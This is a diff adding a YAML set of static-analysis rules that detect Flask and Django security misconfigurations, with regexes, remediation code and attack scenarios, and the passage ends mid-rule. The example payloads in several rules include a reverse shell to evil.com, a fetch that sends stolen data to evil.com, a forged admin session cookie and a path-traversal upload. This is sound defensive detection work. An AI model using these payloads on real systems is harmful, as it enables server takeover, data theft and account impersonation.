@@ -1,0 +1,1368 @@
+rules:
+- rule_id: FW-FLASK-001
+  title: Flask Debug Mode Enabled in Production
+  description: 'Detects Flask applications that run with debug mode enabled, which exposes the interactive Werkzeug debugger.
+    This debugger allows remote code execution through its interactive console, provides full stack traces with source code,
+    and reveals environment variables. Debug mode should never be enabled in production as it provides attackers a direct
+    path to server compromise.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: Critical
+  confidence: 0.95
+  cwe: CWE-489
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - flask
+  - debug
+  - rce
+  - werkzeug
+  - misconfiguration
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: app\.run\s*\([^)]*debug\s*=\s*True
+    description: Flask app.run() with debug=True
+  - type: regex
+    pattern: app\.debug\s*=\s*True
+    description: Flask debug attribute explicitly set to True
+  - type: regex
+    pattern: DEBUG\s*=\s*True
+    description: DEBUG configuration variable set to True
+  - type: regex
+    pattern: FLASK_DEBUG\s*=\s*["\x27]?1["\x27]?
+    description: FLASK_DEBUG environment variable set to 1
+  - type: regex
+    pattern: app\.config\s*\[\s*["\x27]DEBUG["\x27]\s*\]\s*=\s*True
+    description: Debug set via app.config dictionary
+  - type: regex
+    pattern: app\.config\.from_mapping\s*\([^)]*DEBUG\s*=\s*True
+    description: Debug set via config mapping
+  - type: regex
+    pattern: FLASK_ENV\s*=\s*["\x27]development["\x27]
+    description: Flask environment set to development enabling debug features
+  - type: regex
+    pattern: use_debugger\s*=\s*True
+    description: Werkzeug debugger explicitly enabled
+  anti_patterns:
+  - app\.run\s*\([^)]*debug\s*=\s*False
+  - app\.debug\s*=\s*False
+  - DEBUG\s*=\s*False
+  - DEBUG\s*=\s*os\.environ\.get
+  - app\.config\.from_envvar\s*\(
+  - if\s+__name__\s*==\s*["\x27]__main__["\x27][\s\S]*debug\s*=\s*True
+  - FLASK_ENV\s*=\s*["\x27]production["\x27]
+  - app\.run\s*\([^)]*debug\s*=\s*os\.environ
+  - gunicorn
+  - uwsgi
+  - waitress\.serve
+  - config\[.production.\]
+  - ProductionConfig
+  - app\.config\.from_object\s*\(\s*["\x27]\w+\.config\.ProductionConfig
+  - FLASK_DEBUG\s*=\s*["\x27]?0["\x27]?
+  bypass_variants:
+  - description: Debug enabled via environment variable without validation
+    pattern: debug\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]?(True|1)["\x27]?\s*\)
+  - description: Debug controlled by boolean that defaults to True
+    pattern: DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*True\s*\)
+  - description: Debug enabled in config class inherited by production
+    pattern: class\s+Config\s*:[\s\S]*?DEBUG\s*=\s*True[\s\S]*?class\s+ProductionConfig\s*\(\s*Config\s*\)
+  evasion_indicators:
+  - Debug flag set in separate config file not easily discoverable
+  - Debug enabled through FLASK_ENV environment variable
+  - Custom debug middleware that re-enables debugger functionality
+  encoding_variants:
+  - type: string_bool
+    pattern: debug\s*=\s*["\x27]true["\x27]\.lower\s*\(\s*\)\s*==\s*["\x27]true["\x27]
+  - type: int_bool
+    pattern: debug\s*=\s*int\s*\(\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]1["\x27]\s*\)\s*\)
+  multi_function_chain_patterns:
+  - Flask(__name__) -> app.debug = True -> app.run() -> Werkzeug debugger exposed
+  - Flask(__name__) -> config['DEBUG'] = True -> @app.route -> stack trace on error
+  - Flask(__name__) -> FLASK_DEBUG=1 -> app.run(host='0.0.0.0') -> public debugger
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Werkzeug debugger provides interactive Python console with full server access
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Any HTTP request triggering an exception
+    sink: Werkzeug interactive debugger console
+    through: Flask error handler with debug enabled
+  impact: 'When Flask debug mode is enabled in production, the Werkzeug debugger
+
+    exposes an interactive Python console accessible to anyone who can
+
+    trigger an application error. This allows remote code execution,
+
+    reading files from the server, accessing environment variables
+
+    (including secrets), and full server compromise. Detailed stack traces
+
+    also reveal application source code, file paths, and internal logic.
+
+    '
+  remediation: "Ensure debug mode is disabled in production:\n\n```python\nimport os\nfrom flask import Flask\n\napp = Flask(__name__)\n\
+    \n# Never hardcode debug=True\napp.config['DEBUG'] = False\n\n# Use environment-specific configuration\nclass ProductionConfig:\n\
+    \    DEBUG = False\n    TESTING = False\n\nclass DevelopmentConfig:\n    DEBUG = True\n\nconfig = {\n    'production':\
+    \ ProductionConfig,\n    'development': DevelopmentConfig,\n}\n\napp.config.from_object(config[os.environ.get('FLASK_ENV',\
+    \ 'production')])\n\n# Use a production WSGI server\n# gunicorn --bind 0.0.0.0:8000 app:app\n```\n"
+  references:
+  - https://flask.palletsprojects.com/en/latest/debugging/
+  - https://werkzeug.palletsprojects.com/en/latest/debug/
+  - https://cwe.mitre.org/data/definitions/489.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - from\s+flask\s+import\s+Flask
+    - app\s*=\s*Flask\s*\(
+    - app\.run\s*\(
+    - app\.config
+    taint_source_indicators:
+    - request\.args
+    - request\.form
+    - request\.json
+    taint_sink_indicators:
+    - app\.run\s*\(
+    - app\.debug
+    sanitization_patterns:
+    - debug\s*=\s*False
+    - FLASK_ENV\s*=\s*["\x27]production["\x27]
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: 'severity_weight * confidence * (internet_exposed ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker discovers that a Flask application has debug mode enabled.
+
+      They send a request designed to trigger an unhandled exception (e.g.,
+
+      a malformed JSON body). The Werkzeug debugger displays the full stack
+
+      trace with an interactive console. The attacker uses the console to
+
+      execute: import subprocess; subprocess.check_output([''cat'', ''/etc/passwd''])
+
+      gaining access to system files and eventually achieving full server
+
+      compromise through reverse shell execution.
+
+      '
+    example_payload: import subprocess; subprocess.Popen(['bash','-c','bash -i >& /dev/tcp/evil.com/4444 0>&1'])
+    attacker_objective: Achieve remote code execution via the Werkzeug interactive debugger
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-FLASK-002
+    - FW-FLASK-003
+    - FW-DJANGO-001
+- rule_id: FW-FLASK-002
+  title: Missing CORS Configuration in Flask Application
+  description: 'Detects Flask applications that either lack CORS configuration entirely or configure flask-cors with overly
+    permissive settings such as wildcard origins, allowing any domain to make cross-origin requests. Without proper CORS configuration,
+    the API is either completely inaccessible to legitimate frontends or open to abuse from malicious origins.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: High
+  confidence: 0.85
+  cwe: CWE-942
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - flask
+  - cors
+  - cross-origin
+  - misconfiguration
+  - api-security
+  - python
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: CORS\s*\(\s*app\s*\)
+    description: Flask-CORS initialized with default permissive config
+  - type: regex
+    pattern: CORS\s*\(\s*app\s*,\s*resources\s*=\s*\{?\s*r?["\x27]\/?\*["\x27]
+    description: CORS applied to all resources with wildcard
+  - type: regex
+    pattern: origins\s*=\s*["\x27]\*["\x27]
+    description: CORS origins set to wildcard
+  - type: regex
+    pattern: origins\s*=\s*["\x27].*["\x27]\s*,\s*supports_credentials\s*=\s*True
+    description: Wildcarded origins with credentials support
+  - type: regex
+    pattern: Access-Control-Allow-Origin["\x27]\s*,\s*["\x27]\*["\x27]
+    description: Manual wildcard ACAO header in response
+  - type: regex
+    pattern: '@app\.after_request[\s\S]*?Access-Control-Allow-Origin'
+    description: CORS headers set in after_request without origin validation
+  - type: regex
+    pattern: response\.headers\s*\[\s*["\x27]Access-Control-Allow-Origin["\x27]\s*\]\s*=\s*["\x27]\*["\x27]
+    description: Direct wildcard ACAO header assignment
+  - type: regex
+    pattern: response\.headers\s*\[\s*["\x27]Access-Control-Allow-Origin["\x27]\s*\]\s*=\s*request\.headers\.get\s*\(\s*["\x27]Origin["\x27]\s*\)
+    description: Origin reflection in ACAO header
+  anti_patterns:
+  - origins\s*=\s*\[\s*["\x27]https?://[\w.-]+["\x27]
+  - origins\s*=\s*["\x27]https?://[\w.-]+["\x27]
+  - CORS_ORIGINS\s*=\s*\[
+  - CORS_ALLOWED_ORIGINS
+  - allow_origin\s*=\s*\[\s*["\x27]https?://
+  - if\s+origin\s+in\s+allowed_origins
+  - if\s+origin\s+in\s+ALLOWED_ORIGINS
+  - origins\s*=\s*os\.environ\.get
+  - cors_config\s*=\s*\{[^}]*origins\s*:\s*\[
+  - origins\s*=\s*\[\s*os\.environ
+  - talisman\s*\(
+  - flask_talisman
+  - origin\s*==\s*["\x27]https://
+  - CORS\s*\(\s*app\s*,\s*origins\s*=\s*\[
+  - cors_allowed_origins\s*=
+  bypass_variants:
+  - description: CORS restricted on main app but permissive on blueprint
+    pattern: CORS\s*\(\s*\w+_bp\s*,\s*origins\s*=\s*["\x27]\*["\x27]\s*\)
+  - description: Origin validation using string contains instead of exact match
+    pattern: if\s+["\x27]example\.com["\x27]\s+in\s+origin
+  - description: CORS properly configured but overridden in after_request
+    pattern: '@app\.after_request[\s\S]*?Access-Control-Allow-Origin["\x27]\s*\]\s*=\s*["\x27]\*["\x27]'
+  evasion_indicators:
+  - CORS headers set at reverse proxy level superseding Flask config
+  - Flask-CORS configuration in separate config file with permissive defaults
+  - CORS managed by API gateway not captured in application code
+  encoding_variants:
+  - type: header_variable
+    pattern: acao\s*=\s*["\x27]Access-Control-Allow-Origin["\x27][\s\S]*?response\.headers\s*\[\s*acao\s*\]\s*=\s*["\x27]\*["\x27]
+  - type: env_wildcard
+    pattern: origins\s*=\s*os\.environ\.get\s*\(\s*["\x27]CORS_ORIGINS["\x27]\s*,\s*["\x27]\*["\x27]\s*\)
+  multi_function_chain_patterns:
+  - Flask(__name__) -> CORS(app) -> @app.route('/api/') -> credential endpoints exposed
+  - 'Flask(__name__) -> after_request -> ACAO: * -> authenticated API cross-origin access'
+  - Flask(__name__) -> CORS(app, supports_credentials=True) -> session theft
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Permissive CORS allows cross-origin credential theft from authenticated sessions
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Origin header from cross-origin request
+    sink: Access-Control-Allow-Origin response header
+    through: Flask-CORS configuration or after_request handler
+  impact: 'Overly permissive CORS configuration allows malicious websites to make
+
+    authenticated cross-origin requests to the Flask API. When combined
+
+    with supports_credentials=True, attackers can steal session cookies,
+
+    CSRF tokens, and user data. A wildcard CORS policy effectively
+
+    disables the same-origin policy protection for the API.
+
+    '
+  remediation: "Configure Flask-CORS with explicit origin whitelist:\n\n```python\nfrom flask import Flask\nfrom flask_cors\
+    \ import CORS\n\napp = Flask(__name__)\n\nCORS(app, origins=[\n    'https://app.example.com',\n    'https://admin.example.com',\n\
+    ], supports_credentials=True,\n   allow_headers=['Content-Type', 'Authorization'],\n   methods=['GET', 'POST', 'PUT',\
+    \ 'DELETE'])\n```\n"
+  references:
+  - https://flask-cors.readthedocs.io/en/latest/
+  - https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+  - https://cwe.mitre.org/data/definitions/942.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - from\s+flask_cors\s+import\s+CORS
+    - CORS\s*\(
+    - Access-Control-Allow
+    - '@app\.after_request'
+    taint_source_indicators:
+    - request\.headers\.get\s*\(\s*["\x27]Origin["\x27]\s*\)
+    - request\.origin
+    taint_sink_indicators:
+    - response\.headers\s*\[
+    - make_response\s*\(
+    sanitization_patterns:
+    - origin\s+in\s+allowed_origins
+    - origins\s*=\s*\[
+    - CORS_ALLOWED_ORIGINS
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: 'severity_weight * confidence * (credentials_support ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask API at api.vulnerable.com uses CORS(app) with default settings
+
+      (all origins allowed). An attacker''s page at evil.com makes a
+
+      fetch request to api.vulnerable.com/api/user/profile with
+
+      credentials: ''include''. The browser sends the session cookie and
+
+      the API responds with user data. The wildcard CORS policy allows
+
+      evil.com to read the response, stealing the user''s profile data.
+
+      '
+    example_payload: fetch('https://api.vulnerable.com/api/user/profile',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/exfil',{method:'POST',body:JSON.stringify(d)}))
+    attacker_objective: Exploit permissive CORS to steal authenticated user data cross-origin
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-FLASK-001
+    - FW-EXPRESS-002
+    - FW-DJANGO-002
+- rule_id: FW-FLASK-003
+  title: Flask Secret Key Hardcoded in Source Code
+  description: 'Detects Flask applications that define the SECRET_KEY configuration value directly in source code rather than
+    loading it from a secure external source. The secret key is critical for signing session cookies, CSRF tokens, and other
+    cryptographic operations. A hardcoded key committed to version control allows anyone with repository access to forge sessions
+    and bypass security mechanisms.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: Critical
+  confidence: 0.93
+  cwe: CWE-798
+  owasp: A07:2021-Identification and Authentication Failures
+  tags:
+  - flask
+  - secret-key
+  - hardcoded-credentials
+  - session-forgery
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: app\.secret_key\s*=\s*["\x27][^"\x27]{1,100}["\x27]
+    description: Flask secret_key set to hardcoded string
+  - type: regex
+    pattern: SECRET_KEY\s*=\s*["\x27][^"\x27]{1,100}["\x27]
+    description: SECRET_KEY configuration set to hardcoded string
+  - type: regex
+    pattern: app\.config\s*\[\s*["\x27]SECRET_KEY["\x27]\s*\]\s*=\s*["\x27][^"\x27]+["\x27]
+    description: Secret key set via config dictionary with hardcoded value
+  - type: regex
+    pattern: secret_key\s*=\s*["\x27](super_secret|changeme|secret|password|mysecret|flask_secret|default)["\x27]
+    description: Secret key set to common weak default values
+  - type: regex
+    pattern: SECRET_KEY\s*=\s*b["\x27][^"\x27]+["\x27]
+    description: Secret key set to hardcoded bytes literal
+  - type: regex
+    pattern: app\.config\.from_mapping\s*\([^)]*SECRET_KEY\s*=\s*["\x27][^"\x27]+["\x27]
+    description: Secret key hardcoded in config mapping
+  anti_patterns:
+  - SECRET_KEY\s*=\s*os\.environ\.get\s*\(
+  - SECRET_KEY\s*=\s*os\.environ\s*\[\s*["\x27]
+  - SECRET_KEY\s*=\s*os\.urandom\s*\(
+  - SECRET_KEY\s*=\s*secrets\.token_hex\s*\(
+  - SECRET_KEY\s*=\s*secrets\.token_urlsafe\s*\(
+  - app\.config\.from_envvar\s*\(
+  - app\.config\.from_pyfile\s*\(
+  - dotenv
+  - vault\.read\s*\(
+  - ssm\.get_parameter\s*\(
+  - keyring\.get_password\s*\(
+  - decouple\.config\s*\(
+  - from_json\s*\(\s*["\x27]secrets\.json["\x27]
+  - SECRET_KEY\s*=\s*Config\s*\(
+  - environ\.Env
+  bypass_variants:
+  - description: Secret key from environment with weak default fallback
+    pattern: os\.environ\.get\s*\(\s*["\x27]SECRET_KEY["\x27]\s*,\s*["\x27](secret|changeme|default|test)["\x27]\s*\)
+  - description: Secret key generated but printed or logged
+    pattern: SECRET_KEY\s*=\s*os\.urandom[\s\S]*?print\s*\(\s*.*SECRET_KEY
+  - description: Environment-based key but .env file committed to repo
+    pattern: load_dotenv\s*\(\s*\)[\s\S]*?SECRET_KEY\s*=\s*os\.environ
+  evasion_indicators:
+  - Secret key defined in a separate config.py file in the same repository
+  - Secret key in environment variable but .env file committed to version control
+  - Secret key loaded from a config file included in the Docker image
+  encoding_variants:
+  - type: base64_encoded
+    pattern: SECRET_KEY\s*=\s*base64\.b64decode\s*\(\s*["\x27][A-Za-z0-9+/=]+["\x27]\s*\)
+  - type: hex_encoded
+    pattern: SECRET_KEY\s*=\s*bytes\.fromhex\s*\(\s*["\x27][0-9a-fA-F]+["\x27]\s*\)
+  multi_function_chain_patterns:
+  - SECRET_KEY = 'hardcoded' -> session['user'] = user_id -> session forgery possible
+  - SECRET_KEY = 'weak' -> csrf.generate_token() -> CSRF token prediction
+  - SECRET_KEY = 'static' -> itsdangerous.URLSafeSerializer(SECRET_KEY) -> signed token forgery
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Known secret key enables session forgery and admin impersonation
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Hardcoded SECRET_KEY value in source code
+    sink: Session cookie signing, CSRF token generation
+    through: Flask session management and itsdangerous
+  impact: 'A hardcoded Flask SECRET_KEY allows attackers with source code access
+
+    to forge session cookies, impersonate any user including administrators,
+
+    bypass CSRF protections, and decrypt any data encrypted with the key.
+
+    Since the key is in version control, all developers, CI/CD systems,
+
+    and anyone with repository access can exploit this vulnerability.
+
+    '
+  remediation: "Load the secret key from a secure external source:\n\n```python\nimport os\nimport secrets\nfrom flask import\
+    \ Flask\n\napp = Flask(__name__)\n\n# Load from environment variable (preferred)\napp.config['SECRET_KEY'] = os.environ['SECRET_KEY']\n\
+    \n# Or generate securely if not set (development only)\napp.config['SECRET_KEY'] = os.environ.get(\n    'SECRET_KEY',\n\
+    \    secrets.token_hex(32)  # Only for development!\n)\n\n# For production, use a secret manager:\n# - AWS Secrets Manager\n\
+    # - HashiCorp Vault\n# - Azure Key Vault\n# - GCP Secret Manager\n```\n"
+  references:
+  - https://flask.palletsprojects.com/en/latest/config/#SECRET_KEY
+  - https://cwe.mitre.org/data/definitions/798.html
+  - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
+  - https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
+  context_awareness:
+    surrounding_context_patterns:
+    - from\s+flask\s+import\s+Flask
+    - app\.config
+    - SECRET_KEY
+    - session\s*\[
+    taint_source_indicators:
+    - SECRET_KEY\s*=\s*["\x27]
+    - secret_key\s*=\s*["\x27]
+    taint_sink_indicators:
+    - session\s*\[
+    - csrf\.generate
+    - URLSafeSerializer\s*\(
+    - itsdangerous
+    sanitization_patterns:
+    - os\.environ\.get\s*\(\s*["\x27]SECRET_KEY["\x27]
+    - os\.environ\s*\[\s*["\x27]SECRET_KEY["\x27]\s*\]
+    - os\.urandom\s*\(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: 'severity_weight * confidence * (public_repo ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker finds the Flask application source code in a public or
+
+      compromised repository and extracts SECRET_KEY = ''my-super-secret-key''.
+
+      Using flask-unsign, the attacker crafts a session cookie:
+
+      flask-unsign --sign --cookie ''{"user_id": 1, "is_admin": true}''
+
+      --secret ''my-super-secret-key''. The attacker sends this forged cookie
+
+      with requests, gaining full admin access to the application.
+
+      '
+    example_payload: flask-unsign --sign --cookie '{"user_id":1,"is_admin":true}' --secret 'my-super-secret-key'
+    attacker_objective: Forge Flask session cookies to impersonate any user including administrators
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-FLASK-001
+    - FW-DJANGO-003
+- rule_id: FW-FLASK-004
+  title: Unsafe File Upload Handling in Flask
+  description: 'Detects Flask applications that handle file uploads without proper validation of file type, size, content,
+    and storage location. Unsafe file upload handling can lead to arbitrary file write, path traversal, remote code execution
+    via uploaded web shells, and denial of service through oversized files. Flask''s request.files does not enforce any restrictions
+    by default.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: High
+  confidence: 0.88
+  cwe: CWE-434
+  owasp: A04:2021-Insecure Design
+  tags:
+  - flask
+  - file-upload
+  - path-traversal
+  - rce
+  - web-shell
+  - python
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: request\.files\s*\[\s*["\x27]\w+["\x27]\s*\]\.save\s*\(
+    description: Direct file save without validation
+  - type: regex
+    pattern: file\.save\s*\(\s*os\.path\.join\s*\(\s*\w+\s*,\s*file\.filename\s*\)
+    description: Save using original filename without sanitization
+  - type: regex
+    pattern: f\.save\s*\(\s*os\.path\.join\s*\([^)]*f\.filename
+    description: File saved with unsanitized user-provided filename
+  - type: regex
+    pattern: filename\s*=\s*request\.files\s*\[\s*["\x27]\w+["\x27]\s*\]\.filename
+    description: Using original filename from upload
+  - type: regex
+    pattern: open\s*\(\s*os\.path\.join\s*\([^)]*request\.files[^)]*\)[\s\S]*?\.write
+    description: Manual file write with unsanitized upload filename
+  - type: regex
+    pattern: request\.files\s*\[\s*["\x27]\w+["\x27]\s*\]\.read\s*\(\s*\)
+    description: Reading entire uploaded file into memory without size check
+  anti_patterns:
+  - secure_filename\s*\(
+  - werkzeug\.utils\s+import\s+secure_filename
+  - allowed_extensions
+  - ALLOWED_EXTENSIONS
+  - \.rsplit\s*\(\s*["\x27]\.["\x27]\s*,\s*1\s*\)\s*\[\s*1\s*\]\.lower\s*\(\s*\)\s*in\s+
+  - content_type\s*in\s+allowed
+  - MAX_CONTENT_LENGTH
+  - app\.config\s*\[\s*["\x27]MAX_CONTENT_LENGTH["\x27]\s*\]
+  - magic\.from_buffer\s*\(
+  - imghdr\.what\s*\(
+  - mimetypes\.guess_type\s*\(
+  - uuid\.uuid4\s*\(\s*\)
+  - os\.path\.splitext\s*\(
+  - filetype\.guess\s*\(
+  - pillow.*Image\.open
+  bypass_variants:
+  - description: Extension check but no content-type validation (double extension)
+    pattern: filename\.endswith\s*\(\s*["\x27]\.\w+["\x27]\s*\)(?![\s\S]*?(magic|imghdr|filetype))
+  - description: Secure filename used but no extension whitelist
+    pattern: secure_filename\s*\([^)]+\)(?![\s\S]*?ALLOWED_EXTENSIONS)
+  - description: Size limit set but no file type validation
+    pattern: MAX_CONTENT_LENGTH[\s\S]*?\.save\s*\((?![\s\S]*?allowed_extensions)
+  evasion_indicators:
+  - File extension check bypassed with null byte in filename
+  - Content-Type header spoofed to bypass MIME type check
+  - Polyglot file that passes image validation but contains executable code
+  encoding_variants:
+  - type: null_byte
+    pattern: filename\s*=.*\\x00
+  - type: path_traversal
+    pattern: filename\s*=.*\.\./\.\.
+  multi_function_chain_patterns:
+  - request.files['file'] -> file.save(filename) -> web-accessible directory -> RCE
+  - request.files['file'] -> file.filename -> os.path.join(upload_dir, filename) -> path traversal
+  - request.files['file'] -> file.read() -> no size limit -> memory exhaustion DoS
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary file upload enables web shell deployment and code execution
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.files (user-uploaded file)
+    sink: file.save() or open().write()
+    through: Upload handler route
+  impact: 'Unsafe file upload handling allows attackers to upload malicious files
+
+    such as web shells, server-side scripts, or oversized files. Without
+
+    filename sanitization, path traversal can write files anywhere on the
+
+    filesystem. Without extension validation, executable files can be
+
+    uploaded to web-accessible directories. Without size limits, denial
+
+    of service through resource exhaustion is possible.
+
+    '
+  remediation: "Implement comprehensive file upload validation:\n\n```python\nimport os\nimport uuid\nfrom flask import Flask,\
+    \ request\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\napp.config['MAX_CONTENT_LENGTH'] = 5 *\
+    \ 1024 * 1024  # 5MB\nALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}\nUPLOAD_FOLDER = '/var/uploads'  # Outside\
+    \ web root\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n           filename.rsplit('.', 1)[1].lower()\
+    \ in ALLOWED_EXTENSIONS\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files.get('file')\n\
+    \    if not file or not allowed_file(file.filename):\n        return 'Invalid file', 400\n\n    # Use UUID filename to\
+    \ prevent path traversal\n    ext = secure_filename(file.filename).rsplit('.', 1)[1].lower()\n    safe_name = f\"{uuid.uuid4().hex}.{ext}\"\
+    \n    file.save(os.path.join(UPLOAD_FOLDER, safe_name))\n    return 'Uploaded', 200\n```\n"
+  references:
+  - https://flask.palletsprojects.com/en/latest/patterns/fileuploads/
+  - https://cwe.mitre.org/data/definitions/434.html
+  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  - https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - request\.files
+    - \.save\s*\(
+    - upload
+    - UPLOAD_FOLDER
+    taint_source_indicators:
+    - request\.files\s*\[
+    - file\.filename
+    - file\.read\s*\(\s*\)
+    taint_sink_indicators:
+    - \.save\s*\(
+    - open\s*\([^)]*\.write
+    - os\.path\.join\s*\(
+    sanitization_patterns:
+    - secure_filename\s*\(
+    - allowed_file\s*\(
+    - ALLOWED_EXTENSIONS
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (web_accessible_upload_dir ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask application accepts file uploads and saves them to a static
+
+      directory using the original filename. An attacker uploads a file
+
+      named ''../../app/templates/evil.html'' containing a Jinja2 SSTI
+
+      payload. Due to path traversal, the file overwrites a template. On
+
+      next render, the SSTI payload executes, giving the attacker remote
+
+      code execution on the server.
+
+      '
+    example_payload: curl -F 'file=@shell.py;filename=../../app.py' https://target.com/upload
+    attacker_objective: Upload malicious files to achieve code execution or overwrite critical files
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-FLASK-001
+    - FW-LARAVEL-003
+    - FW-SYMFONY-003
+- rule_id: FW-DJANGO-001
+  title: Django DEBUG=True in Production Settings
+  description: 'Detects Django applications with the DEBUG setting set to True in production configuration files. When DEBUG
+    is True, Django displays detailed error pages with full stack traces, local variables, settings values, and SQL queries.
+    This exposes sensitive application internals, database credentials, API keys, and code paths to any user who triggers
+    an error.
+
+    '
+  language: python
+  category: framework_misuse
+  severity: Medium
+  confidence: 0.89
+  cwe: CWE-489
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - django
+  - debug
+  - information-disclosure
+  - misconfiguration
+  - python
+  - settings
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: DEBUG\s*=\s*True
+    description: DEBUG explicitly set to True
+  - type: regex
+    pattern: DEBUG\s*=\s*1
+    description: DEBUG set to integer truthy value
+  - type: regex
+    pattern: DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*True\s*\)
+    description: DEBUG from environment with True as default
+  - type: regex
+    pattern: DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]True["\x27]\s*\)
+    description: DEBUG from environment with string True as default
+  - type: regex
+    pattern: DEBUG\s*=\s*bool\s*\(\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]1["\x27]\s*\)\s*\)
+    description: DEBUG bool cast with truthy default
+  - type: regex
+    pattern: INTERNAL_IPS\s*=\s*\[\s*["\x27]\*["\x27]\s*\]
+    description: INTERNAL_IPS set to wildcard enabling debug toolbar for all
+  anti_patterns:
+  - DEBUG\s*=\s*False
+  - DEBUG\s*=\s*0
+  - DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*False\s*\)
+  - DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]False["\x27]\s*\)
+  - DEBUG\s*=\s*os\.environ\.get\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*["\x27]0["\x27]\s*\)
+  - DEBUG\s*=\s*config\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*default\s*=\s*False
+  - settings/production\.py
+  - DJANGO_SETTINGS_MODULE.*production
+  - .env.*DEBUG\s*=\s*(False|0|false)
+  - strtobool.*DEBUG
+  - environ\.bool\s*\(\s*["\x27]DEBUG["\x27]
+  - decouple\.config\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*default\s*=\s*False
+  - DEBUG\s*=\s*env\.bool\s*\(\s*["\x27]DEBUG["\x27]\s*,\s*default\s*=\s*False
+  - SECURITY_KEY.*DEBUG
